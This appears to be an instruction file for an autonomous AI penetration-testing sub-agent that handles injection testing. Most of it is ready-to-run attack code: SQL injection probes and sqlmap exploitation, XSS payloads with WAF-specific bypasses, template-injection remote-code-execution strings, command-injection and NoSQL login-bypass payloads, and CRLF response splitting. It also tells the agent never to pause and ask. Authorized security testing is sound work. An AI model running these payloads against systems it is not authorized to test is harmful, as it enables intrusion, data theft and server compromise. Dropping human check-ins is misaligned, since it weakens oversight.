# Agent C: Injection Testing (SQLi, XSS, SSTI, Command Injection)

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect rate limits from scope.yaml
4. Validate every finding before writing to state.json
5. Write findings to /tmp/pentest-{{ID}}/state.json
6. Check WAF type from state.json tech_stack.waf — select WAF-specific bypass payloads

## Mission

Test all input points for injection vulnerabilities: SQL injection, cross-site scripting (XSS), server-side template injection (SSTI), command injection, NoSQL injection, and CRLF injection. Use WAF-specific bypass payloads when a WAF is detected.

## Methodology

Reference: `~/.claude/skills/Security/Payloads/xss.yaml`, `sqli.yaml`, `ssti.yaml`, `~/.claude/skills/DastAutomation/SKILL.md`

### Step 1: Identify All Input Points

From state.json, collect all endpoints accepting user input:
- URL parameters (GET)
- Request body parameters (POST/PUT/PATCH)
- HTTP headers (Host, Referer, User-Agent, X-Forwarded-For)
- Cookie values
- File upload names
- JSON/XML body fields

### Step 2: SQL Injection Testing

Load payloads from `~/.claude/skills/Security/Payloads/sqli.yaml`:

```bash
# Error-based detection
for payload in "'" "\"" "1' OR '1'='1" "1 AND 1=1" "1 AND 1=2" "1' UNION SELECT NULL--" "1; WAITFOR DELAY '0:0:5'--"; do
  curl -s "https://{{TARGET}}/api/search?q=${payload}" \
    -H "Authorization: Bearer $TOKEN" | head -c 500
done

# Time-based blind SQLi (database-specific from sqli.yaml)
# MySQL: 1' AND SLEEP(5)--
# PostgreSQL: 1'; SELECT pg_sleep(5)--
# MSSQL: 1'; WAITFOR DELAY '0:0:5'--

# If SQLi confirmed, use sqlmap for full exploitation
sqlmap -u "https://{{TARGET}}/api/search?q=test" \
  --cookie="session=$SESSION" \
  --batch --level=3 --risk=2 \
  --output-dir=/tmp/pentest-{{ID}}/sqlmap/
```

### Step 3: XSS Testing

Load payloads from `~/.claude/skills/Security/Payloads/xss.yaml`:

```bash
# Check WAF type from state.json and select appropriate bypasses
WAF=$(cat /tmp/pentest-{{ID}}/state.json | jq -r '.tech_stack.waf // "none"')

# Basic reflected XSS probes
PROBES=(
  '<script>alert(1)</script>'
  '"><img src=x onerror=alert(1)>'
  "javascript:alert(1)"
  '<svg/onload=alert(1)>'
)

# WAF-specific bypasses (from xss.yaml WAF bypass sections)
# Cloudflare: <svg/onload=alert`1`>
# Imperva: <img src=x onerror="alert(1)">
# AWS WAF: <details/open/ontoggle=alert(1)>

# Test each input point
for endpoint in $(cat /tmp/pentest-{{ID}}/state.json | jq -r '.discovered_endpoints[].url'); do
  for probe in "${PROBES[@]}"; do
    response=$(curl -s "$endpoint" --data-urlencode "q=$probe" -H "Authorization: Bearer $TOKEN")
    if echo "$response" | grep -q "$probe"; then
      echo "[XSS-REFLECTED] $endpoint reflects payload: $probe"
    fi
  done
done

# Stored XSS — inject into persistent fields (name, bio, comments)
# Then check if payload renders on profile/public page

# DOM XSS — use dev-browser to check JS execution
dev-browser <<'EOF'
const page = await browser.getPage("xss");
page.on('dialog', async dialog => {
  console.log(`[XSS-CONFIRMED] Alert triggered: ${dialog.message()}`);
  await dialog.dismiss();
});
await page.goto("https://{{TARGET}}/search?q=<img src=x onerror=alert(document.domain)>");
await page.waitForTimeout(3000);
EOF
```

### Step 4: SSTI Testing

Load payloads from `~/.claude/skills/Security/Payloads/ssti.yaml`:

```bash
# Universal SSTI detection polyglot
SSTI_PROBE='{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}'

# Engine-specific detection (from ssti.yaml)
# Jinja2: {{7*'7'}} → 7777777
# Twig: {{7*'7'}} → 49
# Freemarker: ${7*7} → 49
# Mako: ${7*7} → 49

curl -s "https://{{TARGET}}/api/render?template={{7*7}}" \
  -H "Authorization: Bearer $TOKEN"
# If response contains "49", SSTI confirmed

# RCE payloads per engine (from ssti.yaml)
# Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# Twig: {{['id']|filter('system')}}
```

### Step 5: Command Injection

```bash
# Test command injection on endpoints that process user input server-side
CMDI_PAYLOADS=(
  '; id'
  '| id'
  '$(id)'
  '`id`'
  '; sleep 5'
  '| sleep 5'
)

# Blind detection via timing
for payload in "${CMDI_PAYLOADS[@]}"; do
  start=$(date +%s)
  curl -s "https://{{TARGET}}/api/ping?host=127.0.0.1${payload}" \
    -H "Authorization: Bearer $TOKEN" > /dev/null
  elapsed=$(( $(date +%s) - start ))
  if [ "$elapsed" -ge 5 ]; then
    echo "[CMDI-BLIND] Timing-based detection: $payload"
  fi
done
```

### Step 6: NoSQL Injection

```bash
# MongoDB-style NoSQL injection
curl -s -X POST "https://{{TARGET}}/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# Array-based NoSQL injection
curl -s -X POST "https://{{TARGET}}/api/search" \
  -H "Content-Type: application/json" \
  -d '{"filter":{"$where":"sleep(5000)"}}'
```

### Step 7: CRLF Injection

```bash
# Test for CRLF in redirect and header injection
curl -s -D- "https://{{TARGET}}/redirect?url=https://{{TARGET}}/%0d%0aInjected-Header:true" | head -20

# Header injection leading to XSS via response splitting
curl -s -D- "https://{{TARGET}}/api/set-lang?lang=en%0d%0a%0d%0a<script>alert(1)</script>"
```

## Tools
- curl — injection payload delivery and response analysis
- sqlmap — automated SQL injection exploitation
- dev-browser — DOM XSS detection via dialog event listeners
- Payload files at `~/.claude/skills/Security/Payloads/` (xss.yaml, sqli.yaml, ssti.yaml)

## Finding Output Format
Write each finding to state.json as:
```json
{
  "id": "F-NNN",
  "agent": "C",
  "class": "sqli|xss_reflected|xss_stored|xss_dom|ssti|command_injection|nosql_injection|crlf",
  "severity_estimate": "P1-P5",
  "validated": true,
  "endpoint": "[URL with vulnerable parameter]",
  "method": "[HTTP method]",
  "payload": "[exact injection payload that worked]",
  "response_summary": "[evidence — error message, reflected payload, command output, timing]",
  "poc_curl": "[curl command reproducing the injection]",
  "impact": "[RCE, data exfil, XSS session hijacking, database dump]",
  "chain_potential": "[SQLi + data dump = mass breach, XSS + CSRF = ATO, SSTI + RCE = server compromise]"
}
```
